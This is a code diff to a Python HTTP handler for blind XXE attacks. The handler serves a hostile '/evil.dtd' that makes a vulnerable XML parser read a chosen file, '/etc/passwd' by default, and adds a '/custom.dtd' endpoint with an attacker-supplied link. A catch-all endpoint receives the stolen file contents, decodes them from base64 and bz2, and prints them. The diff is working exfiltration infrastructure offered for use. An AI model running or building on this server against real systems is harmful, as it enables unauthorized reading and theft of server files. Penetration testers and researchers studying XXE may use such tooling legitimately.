@@ -184,9 +184,10 @@ class ProvideHandler(BaseHTTPRequestHandler):
 
 class BlindXXEHandler(BaseHTTPRequestHandler):
 
-    def __init__(self, content, bz2content, *args, **kwargs):
+    def __init__(self, content, bz2content, customcontent, *args, **kwargs):
         self.content = content
         self.bz2content = bz2content
+        self.customcontent = customcontent
         super().__init__(*args, **kwargs)
 
     def log_message(self, format, *args):
@@ -195,7 +196,13 @@ class BlindXXEHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         sendReply = False
         querypath = urlparse(self.path)
-
+        query_dict = {}
+        for kv in querypath.query.split("&"):
+            v = kv.split("=")
+            if len(v) > 1:
+                query_dict[v[0]] = unquote_plus(v[1])
+            else:
+                query_dict[v[0]] = None
         filepath = querypath.path
         try:
             if filepath == "/evil.dtd":
@@ -203,31 +210,31 @@ class BlindXXEHandler(BaseHTTPRequestHandler):
                 self.send_response(200)
                 self.send_header("Content-type", "application/xml-dtd")
                 self.end_headers()
-                query = querypath.query
-                query_dict = {}
-                for kv in query.split("&"):
-                    v = kv.split("=")
-                    if len(v) > 1:
-                        query_dict[v[0]] = v[1]
-                    else:
-                        query_dict[v[0]] = None
                 if "bz2" in query_dict:
                     content = self.bz2content
                 else:
                     content = self.content
                 readFile = query_dict.get("file", "/etc/passwd")
                 content = content.replace(b"!readFile!", readFile.encode())
+                print("test\n", content)
                 self.wfile.write(content)
-            if filepath == "/":
-                data = b64decode(querypath.query).decode()
-                print("Receive file content:\n" + data)
+            elif filepath == "/custom.dtd":
                 sendReply = True
                 self.send_response(200)
+                self.send_header("Content-type", "application/xml-dtd")
                 self.end_headers()
-                self.wfile.write(b'<?xml version="1.0"?>\n<root></root>\n')
-            if filepath == "/bz2":
-                data = bz2decompress(b64decode(querypath.query)).decode()
-                print("Receive file content:\n" + data)
+                content = self.customcontent
+                link = query_dict.get("link", "")
+                content = content.replace(b"!link!", link.encode())
+                self.wfile.write(content)
+            else:
+                data = querypath.query
+                try:
+                    data = b64decode(data)
+                    data = bz2decompress(data)
+                except Exception:
+                    pass
+                print("Receive file content:\n" + data.decode())
                 sendReply = True
                 self.send_response(200)
                 self.end_headers()
